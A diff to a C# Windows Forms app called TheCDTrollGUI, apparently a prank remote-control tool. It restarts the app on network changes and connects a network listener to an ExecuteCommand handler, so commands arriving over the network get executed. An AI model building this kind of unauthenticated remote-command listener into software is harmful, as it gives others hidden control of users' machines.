@@ -9,6 +9,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
+using System.Net.NetworkInformation;
 
 namespace TheCDTrollGUI
 {
@@ -18,9 +19,22 @@ namespace TheCDTrollGUI
 
         public Form1()
         {
+            NetworkChange.NetworkAddressChanged += new NetworkAddressChangedEventHandler(AddressChangedCallback);
+
             InitializeComponent();
             SetUpNotify();
             InitThread();
+        }
+
+        static void AddressChangedCallback(object sender, EventArgs e)
+        {
+            Restart();            
+        }
+
+        private static void Restart()
+        {
+            Application.Restart();
+            Environment.Exit(0);
         }
 
         private void CheckCDDrives()
@@ -47,7 +61,7 @@ namespace TheCDTrollGUI
             {
                 IsBackground = true
             };
-            listeningThread.Start(new Connection.ListenData() { ip = null, func = SMTH });
+            listeningThread.Start(new Connection.ListenData() { ip = null, func = Actions.ExecuteCommand });
         }
 
         private void SetUpNotify()
